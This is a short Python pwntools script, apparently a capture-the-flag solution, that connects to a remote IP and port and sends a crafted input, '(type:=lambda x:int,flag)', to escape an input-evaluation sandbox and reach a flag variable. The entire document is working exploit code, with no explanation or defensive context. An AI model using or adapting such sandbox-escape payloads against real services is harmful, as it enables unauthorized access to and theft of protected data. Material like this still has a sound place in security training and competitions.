#!/usr/bin/env python3

from pwn import *

io = remote("108.137.70.166", 14000)

io.sendlineafter(b">> ", b"(type:=lambda x:int,flag)")

io.interactive()
